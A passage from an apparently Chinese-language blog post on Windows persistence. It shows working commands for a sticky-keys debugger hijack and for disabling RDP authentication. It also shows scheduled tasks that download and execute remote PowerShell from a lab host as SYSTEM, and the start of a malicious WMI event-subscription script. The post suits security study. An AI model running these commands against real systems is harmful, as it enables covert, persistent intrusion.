@@ -1,0 +1,1036 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+        <title>权限维持 - Geekby&#39;s Blog</title><meta name="Description" content="权限维持"><meta property="og:title" content="权限维持" />
+<meta property="og:description" content="权限维持" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://www.geekby.site/2020/12/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2020-12-07T14:24:00+08:00" />
+<meta property="article:modified_time" content="2020-12-07T14:24:00+08:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="权限维持"/>
+<meta name="twitter:description" content="权限维持"/>
+<meta name="application-name" content="Geekby&#39;s Blog">
+<meta name="apple-mobile-web-app-title" content="Geekby&#39;s Blog"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://www.geekby.site/2020/12/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/" /><link rel="prev" href="https://www.geekby.site/2020/09/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/" /><link rel="next" href="https://www.geekby.site/2020/12/ldap-%E5%8D%8F%E8%AE%AE/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "权限维持",
+        "inLanguage": "zh-cn",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/www.geekby.site\/2020\/12\/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81\/"
+        },"image": ["https:\/\/www.geekby.site\/logo.png"],"genre": "posts","keywords": "内网渗透, 权限维持","wordcount":  1439 ,
+        "url": "https:\/\/www.geekby.site\/2020\/12\/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81\/","datePublished": "2020-12-07T14:24:00+08:00","dateModified": "2020-12-07T14:24:00+08:00","publisher": {
+            "@type": "Organization",
+            "name": "Geekby","logo": {
+                    "@type": "ImageObject",
+                    "url": "https:\/\/www.geekby.site\/images\/avatar.png",
+                    "width":  358 ,
+                    "height":  330 
+                }},"author": {
+                "@type": "Person",
+                "name": "Geekby"
+            },"description": "权限维持"
+    }
+    </script></head>
+    <body header-desktop="" header-mobile=""><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Geekby&#39;s Blog">Geekby&#39;s Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/" title="文章"><i class="fas fa-inbox"></i> 文章 </a><a class="menu-item" href="/tags/" title="标签"><i class="fas fa-tags"></i> 标签 </a><a class="menu-item" href="/categories/" title="分类"><i class="fas fa-sort-amount-up-alt"></i> 分类 </a><a class="menu-item" href="/about/" title="关于"><i class="far fa-address-card"></i> 关于 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="输入关键字" id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Geekby&#39;s Blog">Geekby&#39;s Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="输入关键字" id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="文章"><i class="fas fa-inbox"></i>文章</a><a class="menu-item" href="/tags/" title="标签"><i class="fas fa-tags"></i>标签</a><a class="menu-item" href="/categories/" title="分类"><i class="fas fa-sort-amount-up-alt"></i>分类</a><a class="menu-item" href="/about/" title="关于"><i class="far fa-address-card"></i>关于</a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">目录</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animated flipInX">权限维持</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>Geekby</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"><i class="far fa-folder fa-fw"></i>内网渗透</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2020-12-07">2020-12-07</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 1439 字&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 7 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#1-操作系统后门">1 操作系统后门</a>
+      <ul>
+        <li><a href="#11-粘滞键后门">1.1 粘滞键后门</a>
+          <ul>
+            <li><a href="#111-传统方法">1.1.1 传统方法</a></li>
+            <li><a href="#112-新方法">1.1.2 新方法</a>
+              <ul>
+                <li><a href="#1121-关闭-rdp-用户鉴定选项">1.1.2.1 关闭 RDP 用户鉴定选项</a></li>
+                <li><a href="#1122-更改-rdp-安全层设置">1.1.2.2 更改 RDP 安全层设置</a></li>
+              </ul>
+            </li>
+            <li><a href="#113-测试结果">1.1.3 测试结果</a></li>
+          </ul>
+        </li>
+        <li><a href="#12-注册表后门">1.2 注册表后门</a></li>
+        <li><a href="#13-计划任务后门">1.3 计划任务后门</a></li>
+        <li><a href="#14-wmi-无文件后门">1.4 wmi 无文件后门</a></li>
+      </ul>
+    </li>
+    <li><a href="#2-域控后门">2 域控后门</a>
+      <ul>
+        <li><a href="#21-dsrm-后门">2.1 DSRM 后门</a>
+          <ul>
+            <li><a href="#211-修改-dsrm-密码的方法">2.1.1 修改 DSRM 密码的方法</a></li>
+            <li><a href="#212-设置-dsrm-后门">2.1.2 设置 DSRM 后门</a>
+              <ul>
+                <li><a href="#2121-直接为-dsrm-设置新密码">2.1.2.1 直接为 DSRM 设置新密码</a></li>
+                <li><a href="#2122-将-dsrm-的密码同步为一个域用户的已知密码">2.1.2.2 将 DSRM 的密码同步为一个域用户的已知密码</a></li>
+              </ul>
+            </li>
+          </ul>
+        </li>
+        <li><a href="#22-skeleton-key-万能密码">2.2 Skeleton Key 万能密码</a>
+          <ul>
+            <li><a href="#221-在域控上安装-skeleton-key">2.2.1 在域控上安装 Skeleton Key</a></li>
+            <li><a href="#222-在域内主机使用-skeleton-key-登录">2.2.2 在域内主机使用 Skeleton Key 登录</a></li>
+            <li><a href="#223-权限测试">2.2.3 权限测试</a></li>
+            <li><a href="#224-lsa-protection">2.2.4 LSA Protection</a>
+              <ul>
+                <li><a href="#2241-配置-lsa-protection">2.2.4.1 配置 LSA Protection</a></li>
+                <li><a href="#2242-测试-lsa-protection">2.2.4.2 测试 LSA Protection</a></li>
+              </ul>
+            </li>
+            <li><a href="#225-绕过-lsa-protection">2.2.5 绕过 LSA Protection</a></li>
+          </ul>
+        </li>
+        <li><a href="#23-ssp-劫持">2.3 SSP 劫持</a>
+          <ul>
+            <li><a href="#231-mimilib-ssp">2.3.1 mimilib SSP</a>
+              <ul>
+                <li><a href="#2311-通过内存更新留后门临时">2.3.1.1 通过内存更新留后门（临时）</a></li>
+                <li><a href="#2312-通过修改注册表留后门永久">2.3.1.2 通过修改注册表留后门（永久）</a></li>
+              </ul>
+            </li>
+          </ul>
+        </li>
+        <li><a href="#24-sid-history-域后门">2.4 SID History 域后门</a>
+          <ul>
+            <li><a href="#241-添加-sid-history-后门">2.4.1 添加 SID History 后门</a></li>
+            <li><a href="#242-查看-sid-history">2.4.2 查看 SID History</a></li>
+            <li><a href="#243-清除-sid-history">2.4.3 清除 SID History</a></li>
+          </ul>
+        </li>
+        <li><a href="#25-hook-passwordchangenotify">2.5 Hook PasswordChangeNotify</a>
+          <ul>
+            <li><a href="#251-背景">2.5.1 背景</a></li>
+            <li><a href="#252-特点">2.5.2 特点</a></li>
+            <li><a href="#253-实现">2.5.3 实现</a>
+              <ul>
+                <li><a href="#2531-hook-dll">2.5.3.1 Hook DLL</a></li>
+                <li><a href="#2532-dll-注入">2.5.3.2 DLL 注入</a></li>
+              </ul>
+            </li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="权限维持">权限维持</h1>
+<h2 id="1-操作系统后门">1 操作系统后门</h2>
+<h3 id="11-粘滞键后门">1.1 粘滞键后门</h3>
+<h4 id="111-传统方法">1.1.1 传统方法</h4>
+<blockquote>
+<p>在 windows/system32 下，直接将 sethc 程序替换成 cmd.exe</p>
+</blockquote>
+<p>如果目标机是 <code>windows vista</code> 以上的，即 <code>windows vista</code> 以后出的系统，修改 sethc 会提示需要 <code>trustedinstaller</code> 权限，<code>trustedinstaller</code> 是一个安全机制，即系统的最高权限，权限比 <code>administrator</code> 管理员高.</p>
+<p>windows 权限分为三种从低到高依次是 user，administrator，system。而 trustedinstaller 比 administrator 高但没有 system 高，这么做的好处是避免了一些恶意软件修改系统文件的可能，坏处就是自己不能直接操作了，所以要先修改 sethc 需要将其所有者改为改为我们当前管理员用户。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20201207142648.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20201207142648.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20201207142648.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20201207142648.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20201207142648.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20201207142648.png-water_print" /></p>
+<p>在该所有者之前，直接编辑其权限都是灰色的，不能修改，有了所有权之后，便可以编辑其权限，这里需要给予自己权限，如下图：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20201207142731.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20201207142731.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20201207142731.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20201207142731.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20201207142731.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20201207142731.png-water_print" /></p>
+<p>这时可以重命名，也可以直接删除，然后复制 cmd 修改 sethc 即可，然后在锁屏没有密码情况下，可以直接按 5 下 shift 调出 cmd，执行添加新用户等操作，如下图：</p>
+<h4 id="112-新方法">1.1.2 新方法</h4>
+<p>新方法设置粘滞键后门是通过注册表来实现，整体的方法思路就是<code>通过修改注册表的映像劫持</code>和<code>打开其远程桌面</code>来实现。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="n">REG</span> <span class="n">ADD</span> <span class="s2">&#34;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe&#34;</span> <span class="p">/</span><span class="n">v</span> <span class="n">Debugger</span> <span class="p">/</span><span class="n">t</span> <span class="n">REG_SZ</span> <span class="p">/</span><span class="n">d</span> <span class="s2">&#34;C:\windows\system32\cmd.exe&#34;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><strong>命令说明</strong>：reg add 是向注册表添加记录，后面跟的是注册表的位置，这里需要注意的是 HKLM 实际上是 HKEY_LOCAL_MACHINE 的缩写。Image File Execution Option 这个目录就是用来设置镜像劫持的，要被劫持的就是命令中的 sethc 粘滞键程序，随后通过 /v 来指定键名，这个键名 debugger 是固定的，然后通过 /t 来指定类型，即 REG_SZ 字符串类型，最后通过 /d 来指定键的值，即被恶意替换的程序，也就是我们的 cmd。</p>
+<p>设置完镜像劫持后就已经有了我们旧方法中直接替换 sethc 程序的效果，但我们为了方便利用，可以开启目标机的远程桌面，这里我们也通过注册表来设置一下，需要设置两个参数。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20201207150256.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20201207150256.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20201207150256.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20201207150256.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20201207150256.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20201207150256.png-water_print" /></p>
+<h5 id="1121-关闭-rdp-用户鉴定选项">1.1.2.1 关闭 RDP 用户鉴定选项</h5>
+<p>第一个是把远程桌面链接的用户鉴定选项设置为关闭状态，即值为 0，命令行运行以下命令：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="n">REG</span> <span class="n">ADD</span> <span class="s2">&#34;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&#34;</span> <span class="p">/</span><span class="n">v</span> <span class="n">UserAuthentication</span> <span class="p">/</span><span class="n">t</span> <span class="n">REG_DWORD</span> <span class="p">/</span><span class="n">d</span> <span class="n">0</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>用户鉴权即 userauthentication 这个参数的作用：</p>
+<p><code>0</code> 的说明是进行远程桌面前不需要用户身份验证，还是默认值，<code>1</code> 说明的是进行远程桌面前需要进行用户身份验证。为了更好的理解，我们来看下他们的区别，下面是 userauthentication 为 1 的时候：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20201207143935.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20201207143935.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20201207143935.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20201207143935.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20201207143935.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20201207143935.png-water_print" /></p>
+<p>当 userauthentication 为 1 时即远程桌面前进行用户身份验证，这时候远程链接输入 ip 后会要求输入用户名和密码，输入用户名不输入密码直接点连接会提示身份验证错误。而当 userauthentication 为 0 时，即连接前不进行身份验证，这时候输入用户名不输入密码点连接会直接到远程桌面的锁屏那一步。所以设置为 0 我们可以直接到目标的锁屏然后调起 cmd。</p>
+<p><code>注</code>：在 windows server 2012 上默认为 <code>0</code></p>
+<h5 id="1122-更改-rdp-安全层设置">1.1.2.2 更改 RDP 安全层设置</h5>
+<p>第二个是把远程桌面连接的安全层设置为 0，命令行运行以下命令：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="n">REG</span> <span class="n">ADD</span> <span class="s2">&#34;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&#34;</span> <span class="p">/</span><span class="n">v</span> <span class="n">SecurityLayer</span> <span class="p">/</span><span class="n">t</span> <span class="n">REG_DWORD</span> <span class="p">/</span><span class="n">d</span> <span class="n">0</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>0 就是连接前使用 RDP 协议进行身份验证，RDP 即远程桌面连接，可以简单理解为就是关闭验证。1 是指在连接前两端协商来进行身份验证，这个是默认值。2 就是使用 tls 协议来进行。来看下 0 和 1 的区别：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20201207144120.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20201207144120.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20201207144120.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20201207144120.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20201207144120.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20201207144120.png-water_print" /></p>
+<p>在 userauthentication 用户鉴权为 0 的情况下，securitylayer 安全层为 1 的时候是点击连接后输入用户名然后再点连接到目标桌面，而把 securitylayer 改为 0 时，点击连接，会直接到用户的锁屏桌面，省去了输入凭证那一步。所以我们设置为 0，可以直接跳到锁屏桌面调 cmd。</p>
+<p><code>注</code>：在 windows server 2012 上默认为 <code>1</code></p>
+<h4 id="113-测试结果">1.1.3 测试结果</h4>
+<p>经过测试，在 win10 上 RDP 连接断开时 msf 的会话立刻断开，在 windows server 2008 上成功。</p>
+<h3 id="12-注册表后门">1.2 注册表后门</h3>
+<blockquote>
+<p>Run：该项下的键值即为开机启动项</p>
+</blockquote>
+<p>位置：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
+</code></pre></td></tr></table>
+</div>
+</div><p>msf 下的命令：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">use exploit/windows/local/persistence
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="13-计划任务后门">1.3 计划任务后门</h3>
+<ul>
+<li>schtasks
+<ul>
+<li>/Create 创建新任务。</li>
+<li>/Delete 删除计划任务。</li>
+<li>/Query 显示所有计划任务。</li>
+<li>/Change 更改计划任务属性。</li>
+<li>/Run 按需运行计划任务。</li>
+<li>/End 中止当前正在运行的计划任务。</li>
+<li>/ShowSid 显示与计划的任务名称相应的安全标识符。</li>
+</ul>
+</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c"># schtasks 命令</span>
+<span class="c"># 每天晚上 03:30 定时执行</span>
+<span class="n">schtasks</span> <span class="p">/</span><span class="n">create</span> <span class="p">/</span><span class="n">tn</span> <span class="s2">&#34;TimedTask1&#34;</span> <span class="p">/</span><span class="n">tr</span> <span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">Administrator</span><span class="p">\</span><span class="n">Desktop</span><span class="p">\</span><span class="n">TimedTask</span><span class="p">\</span><span class="n">Run</span><span class="p">.</span><span class="n">bat</span> <span class="p">/</span><span class="nb">sc </span><span class="n">DAILY</span> <span class="p">/</span><span class="n">st</span> <span class="n">03</span><span class="err">:</span><span class="n">30</span> 
+<span class="c"># statement A</span>
+
+<span class="c"># 查询创建的任务</span>
+<span class="n">schtasks</span> <span class="p">/</span><span class="n">query</span> <span class="p">/</span><span class="n">tn</span> <span class="n">TimedTask1</span> <span class="p">/</span><span class="n">v</span>
+
+<span class="c"># 立即运行创建的任务</span>
+<span class="n">schtasks</span> <span class="p">/</span><span class="n">run</span> <span class="p">/</span><span class="n">tn</span> <span class="n">TimedTask1</span>
+
+<span class="c"># 删除任务</span>
+<span class="n">schtasks</span> <span class="p">/</span><span class="n">delete</span> <span class="p">/</span><span class="n">tn</span> <span class="n">TimedTask1</span>
+</code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c">#(X64) - On System Start</span>
+<span class="n">schtasks</span> <span class="p">/</span><span class="n">create</span> <span class="p">/</span><span class="n">tn</span> <span class="n">PentestLab</span> <span class="p">/</span><span class="n">tr</span> <span class="s2">&#34;c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c &#39;IEX ((new-object net.webclient).downloadstring(&#39;&#39;http://10.0.2.21:8080/ZPWLywg&#39;&#39;&#39;))&#39;&#34;</span> <span class="p">/</span><span class="nb">sc </span><span class="n">onstart</span> <span class="p">/</span><span class="n">ru</span> <span class="n">System</span>
+ 
+<span class="c">#(X64) - On User Idle (30mins)</span>
+<span class="n">schtasks</span> <span class="p">/</span><span class="n">create</span> <span class="p">/</span><span class="n">tn</span> <span class="n">PentestLab</span> <span class="p">/</span><span class="n">tr</span> <span class="s2">&#34;c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c &#39;IEX ((new-object net.webclient).downloadstring(&#39;&#39;http://10.0.2.21:8080/ZPWLywg&#39;&#39;&#39;))&#39;&#34;</span> <span class="p">/</span><span class="nb">sc </span><span class="n">onidle</span> <span class="p">/</span><span class="n">i</span> <span class="n">30</span>
+ 
+<span class="c">#(X86) - On User Login</span>
+<span class="n">schtasks</span> <span class="p">/</span><span class="n">create</span> <span class="p">/</span><span class="n">tn</span> <span class="n">PentestLab</span> <span class="p">/</span><span class="n">tr</span> <span class="s2">&#34;c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c &#39;IEX ((new-object net.webclient).downloadstring(&#39;&#39;http://10.0.2.21:8080/ZPWLywg&#39;&#39;&#39;))&#39;&#34;</span> <span class="p">/</span><span class="nb">sc </span><span class="n">onlogon</span> <span class="p">/</span><span class="n">ru</span> <span class="n">System</span>
+  
+<span class="c">#(X86) - On System Start</span>
+<span class="n">schtasks</span> <span class="p">/</span><span class="n">create</span> <span class="p">/</span><span class="n">tn</span> <span class="n">PentestLab</span> <span class="p">/</span><span class="n">tr</span> <span class="s2">&#34;c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c &#39;IEX ((new-object net.webclient).downloadstring(&#39;&#39;http://10.0.2.21:8080/ZPWLywg&#39;&#39;&#39;))&#39;&#34;</span> <span class="p">/</span><span class="nb">sc </span><span class="n">onstart</span> <span class="p">/</span><span class="n">ru</span> <span class="n">System</span>
+  
+<span class="c">#(X86) - On User Idle (30mins)</span>
+<span class="n">schtasks</span> <span class="p">/</span><span class="n">create</span> <span class="p">/</span><span class="n">tn</span> <span class="n">PentestLab</span> <span class="p">/</span><span class="n">tr</span> <span class="s2">&#34;c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c &#39;IEX ((new-object net.webclient).downloadstring(&#39;&#39;http://10.0.2.21:8080/ZPWLywg&#39;&#39;&#39;))&#39;&#34;</span> <span class="p">/</span><span class="nb">sc </span><span class="n">onidle</span> <span class="p">/</span><span class="n">i</span> <span class="n">30</span>
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="14-wmi-无文件后门">1.4 wmi 无文件后门</h3>
+<p>evil3.vbs -&gt; 恶意VBS脚本。创建事件过滤器，捕获账户成功登陆的事件；创建活动脚本事件消费者，捕获到事件后执行远程脚本pnc.js;绑定过滤器和消费者。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">nslink=&#34;winmgmts:\\.\root\subscription:&#34;
+
+qstr=&#34;select * from __InstanceCreationEvent within 5 &#34;        &#39;每5秒查询一次“实例创建事件”&#39;
+qstr=qstr&amp;&#34;where targetinstance isa &#39;win32_NTLogEvent&#39; and &#34;
+qstr=qstr&amp;&#34;targetinstance.EventCode=&#39;4624&#39; &#34;                  &#39;实例名是win32_NTLogEvent&#39;
+
+
+set evtflt=getobject(nslink&amp;&#34;__EventFilter&#34;).spawninstance_   &#39;创建事件过滤器&#39;
+evtflt.name=&#34;filtP1&#34;                                          &#39;定义过滤器的名字&#39;
+evtflt.EventNameSpace=&#34;root\cimv2&#34;
+evtflt.query=qstr                                             &#39;定义查询语句&#39;
+evtflt.querylanguage=&#34;wql&#34;                                    &#39;定义查询语言(只能是wql)&#39;
+set fltpath=evtflt.put_                                       &#39;注册过滤器，返回其链接&#39;
+
